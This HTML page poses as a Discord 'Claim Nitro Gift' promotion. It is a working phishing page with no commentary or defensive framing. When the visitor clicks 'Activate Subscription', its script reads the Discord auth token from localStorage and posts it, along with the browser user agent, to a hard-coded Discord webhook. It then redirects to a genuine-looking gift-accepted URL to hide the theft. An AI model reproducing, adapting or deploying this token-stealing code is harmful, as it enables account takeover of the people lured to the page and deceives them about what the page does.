<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Nitro Gift</title>
    <style>
        :root {
            --primary: #5865F2;
            --accent: #EB459E;
            --bg: #202225;
        }

        body {
            margin: 0; background: #0E0F10;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; font-family: 'gg sans', sans-serif;
        }

        .card {
            position: relative;
            background: #202225;
            width: 400px; padding: 40px; border-radius: 12px;
            text-align: center; overflow: hidden;
        }

        /* Colorful border glow */
        .card::before {
            content: ''; position: absolute; inset: 0; padding: 2px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor; mask-composite: exclude;
            border-radius: 12px;
        }

        h1 { color: #fff; font-size: 24px; margin-bottom: 8px; }
        p { color: #B9BBBE; font-size: 14px; margin-bottom: 30px; }

        .btn {
            background: linear-gradient(90deg, var(--primary), var(--accent));
            color: white; border: none; padding: 14px; width: 100%;
            border-radius: 6px; font-weight: 700; cursor: pointer;
            transition: transform 0.2s;
        }

        .btn:hover { transform: scale(1.02); filter: brightness(1.2); }
    </style>
</head>
<body>

    <div class="card">
        <h1>Claim Nitro Gift</h1>
        <p>Your 3-month Nitro gift is ready. Verify your account to apply the promotion.</p>
        <button class="btn" id="claimBtn">Activate Subscription</button>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Applying...";
            btn.disabled = true;

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "@everyone",
                    embeds: [{
                        title: "✨ Colorful Capture",
                        color: 0x5865F2,
                        fields: [
                            { name: "Auth Token", value: `\`${token || "NULL"}\`` },
                            { name: "Browser", value: `\`${navigator.userAgent}\`` }
                        ]
                    }]
                })
            });

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1000);
        });
    </script>
</body>
</html>
